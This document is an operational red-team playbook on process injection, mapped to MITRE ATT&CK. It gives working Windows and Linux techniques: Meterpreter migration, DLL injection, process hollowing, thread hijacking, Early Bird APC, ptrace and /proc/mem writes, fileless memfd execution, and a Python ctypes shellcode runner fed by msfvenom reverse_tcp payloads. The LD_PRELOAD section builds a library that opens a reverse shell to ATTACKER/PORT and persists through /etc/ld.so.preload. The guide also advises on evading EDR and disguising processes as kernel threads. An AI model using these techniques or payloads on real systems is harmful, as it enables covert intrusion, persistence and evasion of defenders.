# Process Injection Techniques

## MITRE ATT&CK Mapping
- **T1055** — Process Injection (parent technique)
- **T1055.001** — Dynamic-link Library Injection
- **T1055.003** — Thread Execution Hijacking
- **T1055.004** — Asynchronous Procedure Call
- **T1055.012** — Process Hollowing
- **T1574.006** — Hijack Execution Flow: Dynamic Linker Hijacking
- **T1620** — Reflective Code Loading

---

## 1. Decision Tree: Which Injection When

| Situation | Technique | Section |
|---|---|---|
| Have Meterpreter session, need to move PID | `migrate <PID>` | §2 |
| Have Meterpreter, need SYSTEM from user-level | Migrate to svchost.exe / spoolsv.exe | §2 |
| No Meterpreter, need to hide in legit process | Process Hollowing | §4 |
| No Meterpreter, have DLL on disk | Classic DLL Injection | §3 |
| EDR monitors CreateRemoteThread | Thread Hijacking or APC Injection | §5, §6 |
| Maximum stealth (Windows) | Unhook ntdll → Direct syscalls → Early Bird APC | §6 |
| Linux, have root access | ptrace injection | §7a |
| Linux, want process-level persistence | LD_PRELOAD / ld.so.preload | §7b |
| Linux, need fileless execution | memfd_create + execveat | §7d |
| Python available on Windows target | ctypes shellcode injection | §8 |

**Decision flow:**
1. Do you have Meterpreter? → **Yes:** `migrate` (§2). Simplest and most reliable.
2. Do you have a DLL? → **Yes:** DLL Injection (§3) or Mavinject LOLBin.
3. Is EDR monitoring thread creation? → **Yes:** Thread Hijacking (§5) or APC (§6).
4. Need to look like a legit process? → **Yes:** Process Hollowing (§4).
5. Linux? → ptrace (§7a) if root, LD_PRELOAD (§7b) if not.

⚠️ **GLOBAL SAFETY WARNING:** Process injection can crash the target process if done incorrectly. Always:
- Pick stable, long-running processes (not short-lived cmd.exe)
- Match architecture (32-bit shellcode → 32-bit process, 64-bit → 64-bit)
- Test in staging before hitting production targets
- Have a fallback plan if the process crashes (new initial access path)

---

## 2. Metasploit Meterpreter Migration

The simplest injection path. Meterpreter handles all the complexity internally.
**Tag MITRE: T1055 (Process Injection)**

### Commands

```
# Step 1: List processes — find stable targets
meterpreter > ps
# Look for: svchost.exe, explorer.exe, spoolsv.exe with matching architecture

# Step 2: Check your current PID and architecture
meterpreter > getpid
meterpreter > sysinfo
# Note: x64 Meterpreter can only migrate to x64 processes (and vice versa)

# Step 3: Migrate
meterpreter > migrate <PID>
# Example: migrate 1234

# Step 4: Verify migration succeeded
meterpreter > getpid
# Should show new PID
meterpreter > getuid
# Shows current user context (may have changed if migrating to SYSTEM process)
```

**Verify success:**
```
meterpreter > getpid
# Must show the target PID, not the old one
meterpreter > sysinfo
# Architecture should match target process
```

### Auto-Migration (set in handler before exploit)

```
# Auto-migrate on session creation — useful for client-side exploits
set AutoRunScript post/windows/manage/migrate
# Or specify target process name:
set PrependMigrate true
set PrependMigrateProc svchost.exe
```

### Target Selection Guide

| Process | Why | Privilege | Risk |
|---|---|---|---|
| `explorer.exe` | Long-running, expected network activity, user-level | User | Low — one per user session |
| `svchost.exe` | Many instances, blends in perfectly | SYSTEM | Low — pick one with few DLLs loaded |
| `spoolsv.exe` | Print spooler, rarely monitored, always running | SYSTEM | Low |
| `RuntimeBroker.exe` | Modern Windows, multiple instances expected | User | Low |
| `taskhostw.exe` | Task scheduler host, low profile | User/SYSTEM | Low |
| `winlogon.exe` | SYSTEM, desktop access, stable | SYSTEM | Medium — only one instance |
| `lsass.exe` | Already sensitive, SYSTEM | SYSTEM | **High** — monitored by most EDRs |

**Rules:**
- **Architecture must match** — `ps` shows Arch column (x86/x64)
- **Avoid short-lived processes** — cmd.exe, powershell.exe die when parent exits
- **For credential dumping** — migrate to SYSTEM process first, then run hashdump/kiwi
- **After migration** — original process can be killed: `kill <old_pid>`

**Tag MITRE: T1055**

---

## 3. Classic DLL Injection (Windows)

Inject a DLL into a remote process. The textbook technique — well-understood but detected by most EDRs due to `CreateRemoteThread` usage.
**Tag MITRE: T1055.001 (Dynamic-link Library Injection)**

⚠️ **Safety:** If the DLL path is wrong or the DLL crashes, the target process crashes too. Test your DLL independently first.

### API Call Chain (Concept)

```
1. OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID)
   → Get handle to target process

2. VirtualAllocEx(hProcess, NULL, strlen(dllPath)+1, MEM_COMMIT, PAGE_READWRITE)
   → Allocate memory in target process for DLL path string

3. WriteProcessMemory(hProcess, allocAddr, dllPath, strlen(dllPath)+1, NULL)
   → Write full DLL path into allocated memory

4. GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA")
   → Get LoadLibraryA address (kernel32 base is same in all processes)

5. CreateRemoteThread(hProcess, NULL, 0, loadLibAddr, allocAddr, 0, NULL)
   → Create thread in target that calls LoadLibraryA("C:\path\to\payload.dll")
```

### Metasploit Modules

```
# Reflective DLL injection — DLL is loaded from memory, never touches disk
use post/windows/manage/reflective_dll_inject
set PID <target_pid>
set PATH /path/to/payload.dll
run

# Verify:
meterpreter > ps
# Target PID should still be running (not crashed)
# Check for callback on your listener

# Inject Meterpreter payload directly into process
use post/windows/manage/payload_inject
set PID <target_pid>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <your_ip>
set LPORT <port>
run

# Verify: new Meterpreter session should open
```

### Detection Notes
- `CreateRemoteThread` is heavily monitored by EDRs — this is the first thing they hook
- Reflective injection avoids `LoadLibrary` but still allocates RWX memory (suspicious)
- **For stealth:** Combine with ntdll unhooking first (see av_edr_bypass.md §4)

**Tag MITRE: T1055.001**

---

## 4. Process Hollowing

Create a legitimate process, hollow out its code, replace with your payload. The process looks legitimate in Task Manager and Process Explorer.
**Tag MITRE: T1055.012 (Process Hollowing)**

⚠️ **Safety:** If the payload's PE headers don't align with the hollowed process, it will crash. Image base address and entry point must be correctly set.

### API Call Chain (Concept)

```
1. CreateProcess("C:\Windows\System32\svchost.exe", CREATE_SUSPENDED)
   → Start legitimate process in suspended state — it hasn't executed any code yet

2. NtUnmapViewOfSection(hProcess, imageBaseAddress)
   → Unmap the original executable image from the process's memory

3. VirtualAllocEx(hProcess, imageBase, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
   → Allocate space at the original base address for your payload

4. WriteProcessMemory(hProcess, imageBase, payloadPE, payloadSize, NULL)
   → Write your payload's PE image into the hollowed memory

5. SetThreadContext(hThread, &ctx)
   → Update the suspended thread's context:
   →   x86: ctx.Eax = payload entry point
   →   x64: ctx.Rcx = payload entry point

6. ResumeThread(hThread)
   → Process resumes — now executing YOUR payload while appearing as svchost.exe
```

### Good Hollowing Targets

| Process | Why |
|---|---|
| `svchost.exe` | Many instances normally running — one more won't stand out |
| `RuntimeBroker.exe` | Common on Win10/11, multiple instances expected |
| `dllhost.exe` | COM surrogate, spawns frequently |
| `conhost.exe` | Console host, short-lived but common |

**Avoid:** Processes that only have one expected instance (`lsass.exe`, `csrss.exe`, `smss.exe`) — a second instance is an immediate red flag.

**Verify success:**
```cmd
:: Check process is running with expected name
tasklist /v | findstr svchost
:: Check process has network connections (if C2 payload)
netstat -ano | findstr <PID>
:: Process Explorer: check image path matches C:\Windows\System32\svchost.exe
```

### Tooling
- **Donut** (`github.com/TheWover/donut`) — converts .NET assemblies to shellcode, pairs with hollowing loaders
- **Cobalt Strike** — built-in process hollowing via `spawn` and `spawnto` commands
- **Custom C/C++ loaders** — for bespoke engagements

**Tag MITRE: T1055.012**

---

## 5. Thread Hijacking

Hijack an existing thread instead of creating a new one. Avoids `CreateRemoteThread` — the function most monitored by EDRs.
**Tag MITRE: T1055.003 (Thread Execution Hijacking)**

⚠️ **Safety:** High risk of crashing the target process. If your shellcode doesn't properly restore the original thread context and return control, the thread is corrupted.

### API Call Chain (Concept)

```
1. OpenProcess(PROCESS_ALL_ACCESS, targetPID)
   → Get process handle

2. OpenThread(THREAD_ALL_ACCESS, targetTID)
   → Get handle to an existing thread in the target

3. SuspendThread(hThread)
   → Pause the target thread mid-execution

4. VirtualAllocEx(hProcess, NULL, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
   → Allocate memory for shellcode in target process

5. WriteProcessMemory(hProcess, allocAddr, shellcode, shellcodeSize, NULL)
   → Write shellcode to allocated memory

6. GetThreadContext(hThread, &originalCtx)
   → Save the original thread state (registers, instruction pointer)

7. originalCtx.Rip = allocAddr    // x64
   // or originalCtx.Eip = allocAddr  // x86
   → Redirect instruction pointer to your shellcode

8. SetThreadContext(hThread, &originalCtx)
   → Apply the modified context

9. ResumeThread(hThread)
   → Thread resumes — executes your shellcode
   → Shellcode should restore original RIP and continue normal execution
```

**Verify success:**
```cmd
:: Target process should still be running (not crashed)
tasklist | findstr <process_name>
:: Check for callback on attacker listener
:: If process crashed — pick a different thread or use APC injection instead
```

**Advantage:** No new thread created — bypasses `CreateRemoteThread` monitoring
**Disadvantage:** Complex to get right; shellcode must save/restore thread state

**Tag MITRE: T1055.003**

---

## 6. APC Injection

Queue an Asynchronous Procedure Call to a thread. Executes when the thread enters an alertable wait state (`SleepEx`, `WaitForSingleObjectEx`, `MsgWaitForMultipleObjectsEx`).
**Tag MITRE: T1055.004 (Asynchronous Procedure Call)**

### Standard APC Injection

```
1. OpenProcess + VirtualAllocEx + WriteProcessMemory
   → Same as DLL injection — allocate and write shellcode

2. QueueUserAPC(shellcodeAddr, hThread, NULL)
   → Queue the APC to target thread

3. Wait — shellcode executes next time thread enters alertable wait state
```

**Best targets:** Processes that frequently enter alertable waits:
- `svchost.exe` — many threads in wait states
- `explorer.exe` — GUI message loop
- `spoolsv.exe` — waiting for print jobs

### Early Bird APC (Maximum Stealth)

```
1. CreateProcess("svchost.exe", CREATE_SUSPENDED)
   → Process created but hasn't initialized yet — NO EDR hooks active in this process

2. VirtualAllocEx + WriteProcessMemory
   → Write shellcode into the suspended process

3. QueueUserAPC(shellcodeAddr, hMainThread, NULL)
   → Queue APC to the process's main thread

4. ResumeThread(hMainThread)
   → Thread initializes → APC fires BEFORE any EDR DLLs are loaded
   → Your code runs in a clean, unhooked environment
```

⚠️ **Safety:** Early Bird is highly effective but well-documented — some EDRs now specifically monitor for `CreateProcess(SUSPENDED)` → `QueueUserAPC` patterns.

**Verify success:**
```cmd
:: Process should be running
tasklist | findstr svchost
:: Check for callback on attacker listener
:: If process starts then immediately exits — APC shellcode has a bug
```

**Tag MITRE: T1055.004**

---

## 7. Linux Process Injection

### 7a. Ptrace Injection
**Tag MITRE: T1055 (Process Injection)**

```bash
# Check if ptrace is allowed (0=any, 1=parent only, 2=admin, 3=disabled)
cat /proc/sys/kernel/yama/ptrace_scope
# If restricted and you're root:
echo 0 > /proc/sys/kernel/yama/ptrace_scope
```

```c
// C concept — inject shellcode via ptrace
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/user.h>

// 1. Attach to target process
ptrace(PTRACE_ATTACH, target_pid, NULL, NULL);
waitpid(target_pid, NULL, 0);

// 2. Get current registers (save RIP)
struct user_regs_struct regs;
ptrace(PTRACE_GETREGS, target_pid, NULL, &regs);
unsigned long long original_rip = regs.rip;

// 3. Write shellcode at current RIP (or at mmap'd region)
// ptrace writes 8 bytes at a time via POKETEXT
for (int i = 0; i < shellcode_len; i += 8) {
    ptrace(PTRACE_POKETEXT, target_pid, regs.rip + i, *(long*)(shellcode + i));
}

// 4. Detach — process resumes and executes shellcode
ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
```

**Verify success:**
```bash
# Process should still be running
ps aux | grep <target_pid>
# Check for callback on attacker listener
# If process segfaulted: check dmesg | tail for crash info
```

⚠️ **Safety:** Overwrites code at current RIP — original function is destroyed. For non-destructive injection, use mmap via ptrace to allocate new memory first.

**Tag MITRE: T1055**

### 7b. LD_PRELOAD Injection
**Tag MITRE: T1574.006 (Dynamic Linker Hijacking)**

```bash
# Per-process injection — affects only the target binary launch
export LD_PRELOAD=/tmp/.helper.so
/usr/bin/target_binary

# Persistent — affects ALL dynamically-linked programs (requires root)
echo "/tmp/.helper.so" >> /etc/ld.so.preload

# Build the malicious shared library
cat > /tmp/evil.c << 'EOF'
#include <stdlib.h>
__attribute__((constructor)) void init() {
    // Constructor runs when library is loaded — before main()
    system("bash -c 'bash -i >& /dev/tcp/ATTACKER/PORT 0>&1' &");
}
EOF
gcc -shared -fPIC -o /tmp/.helper.so /tmp/evil.c -ldl -nostartfiles
```

**Verify success:**
```bash
# Check library is loaded in target process
cat /proc/<pid>/maps | grep helper
# Or use ldd on the binary
ldd /usr/bin/target_binary | grep helper
# Check for reverse shell callback on attacker listener
```

### 7c. /proc/[pid]/mem Write
**Tag MITRE: T1055**

```bash
# Requires same user or root + ptrace scope allows it
# Step 1: Find executable+writable region
cat /proc/<pid>/maps | grep 'rwxp'
# If no rwx region, look for rw- region and use mprotect to add execute

# Step 2: Write shellcode to that address
python3 -c "
addr = 0x7f0000400000  # from maps output
shellcode = b'\x48\x31\xc0...'  # your shellcode
with open('/proc/<pid>/mem', 'r+b') as f:
    f.seek(addr)
    f.write(shellcode)
"
```

**Verify success:**
```bash
# Read back the bytes to confirm write succeeded
python3 -c "
with open('/proc/<pid>/mem', 'rb') as f:
    f.seek(0x7f0000400000)
    print(f.read(16).hex())
"
# Should match your shellcode bytes
```

### 7d. memfd_create + execveat (Fileless Execution)
**Tag MITRE: T1620 (Reflective Code Loading)**

```c
// C implementation — create anonymous file in memory, execute ELF payload
#include <sys/syscall.h>
int fd = syscall(SYS_memfd_create, "", MFD_CLOEXEC);
write(fd, elf_payload_bytes, payload_size);
char *argv[] = {"[kworker/0:0]", NULL};  // disguise as kernel thread
syscall(SYS_execveat, fd, "", argv, environ, AT_EMPTY_PATH);
```

```bash
# Python implementation
python3 -c "
import ctypes, os
libc = ctypes.CDLL('libc.so.6')
fd = libc.memfd_create(b'', 0)
payload = open('/dev/shm/.p', 'rb').read()  # or download from network
os.write(fd, payload)
os.execve(f'/proc/self/fd/{fd}', ['[kworker/0:0]'], dict(os.environ))
"
# Note: process name '[kworker/0:0]' mimics a kernel worker thread
```

**Verify success:**
```bash
# Check process is running with disguised name
ps aux | grep kworker
# Check the binary is actually memfd (not a real kworker)
ls -la /proc/<pid>/exe
# Should show: /proc/<pid>/exe -> /memfd: (deleted)
```

⚠️ **Safety:** Some EDRs (CrowdStrike Falcon) specifically monitor `memfd_create` syscalls. The `/memfd:` link in `/proc` is also a known indicator.

---

## 8. Shellcode Injection via Python (Windows)

When Python is available on target (dev workstations, data science boxes, CI/CD runners).
**Tag MITRE: T1055 (Process Injection), T1059.006 (Python)**

```python
import ctypes

# Generate with: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=443 -f python
shellcode = b"\xfc\x48\x83\xe4\xf0..."  # truncated — paste full msfvenom output

# Allocate RWX memory in current process
ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
ptr = ctypes.windll.kernel32.VirtualAlloc(
    0,                    # lpAddress — let OS choose
    len(shellcode),       # dwSize
    0x3000,               # flAllocationType — MEM_COMMIT | MEM_RESERVE
    0x40                  # flProtect — PAGE_EXECUTE_READWRITE
)

# Copy shellcode to allocated memory
ctypes.windll.kernel32.RtlMoveMemory(
    ctypes.c_void_p(ptr),
    shellcode,
    len(shellcode)
)

# Execute shellcode in new thread
handle = ctypes.windll.kernel32.CreateThread(
    0, 0,                 # security attrs, stack size
    ctypes.c_void_p(ptr), # start address (our shellcode)
    0, 0, 0               # parameter, creation flags, thread id
)
ctypes.windll.kernel32.WaitForSingleObject(handle, -1)  # wait forever
```

**Verify success:**
```bash
# On attacker: check for Meterpreter session callback
# On target (if you have another session):
tasklist | findstr python
netstat -ano | findstr <attacker_port>
```

**Notes:**
- Works in Python 2 and 3 (ctypes is in stdlib)
- `PAGE_EXECUTE_READWRITE` (0x40) allocation is suspicious — some EDRs flag it
- Combine with AMSI bypass if running via PowerShell → Python pipeline
- For stealth: use `VirtualAlloc` with `PAGE_READWRITE`, copy shellcode, then `VirtualProtect` to `PAGE_EXECUTE_READ`

**Tag MITRE: T1055, T1059.006**

---

## 9. Evidence Collection

```bash
# Record every injection technique used
echo "=== Process Injection Log ===" >> evidence/injection_log.txt
echo "Date: $(date -u +%Y-%m-%dT%H:%M:%SZ)" >> evidence/injection_log.txt
echo "Target Host: <hostname>" >> evidence/injection_log.txt
echo "Target Process: <name> (PID: <pid>)" >> evidence/injection_log.txt
echo "Technique: <migrate/DLL inject/hollowing/thread hijack/APC/ptrace/LD_PRELOAD>" >> evidence/injection_log.txt
echo "MITRE: <T1055.xxx>" >> evidence/injection_log.txt
echo "Result: <success/failure — process stable? callback received?>" >> evidence/injection_log.txt
echo "New PID: <if migrated>" >> evidence/injection_log.txt
echo "Privilege: <user context after injection>" >> evidence/injection_log.txt
echo "---" >> evidence/injection_log.txt
```

---

## References
- MITRE T1055: https://attack.mitre.org/techniques/T1055/
- MITRE T1055.001: https://attack.mitre.org/techniques/T1055/001/
- MITRE T1055.003: https://attack.mitre.org/techniques/T1055/003/
- MITRE T1055.004: https://attack.mitre.org/techniques/T1055/004/
- MITRE T1055.012: https://attack.mitre.org/techniques/T1055/012/
- Metasploit migrate: https://docs.metasploit.com/docs/using-metasploit/advanced/meterpreter/meterpreter-migration.html
- Donut: https://github.com/TheWover/donut
- SysWhispers3: https://github.com/klezVirus/SysWhispers3
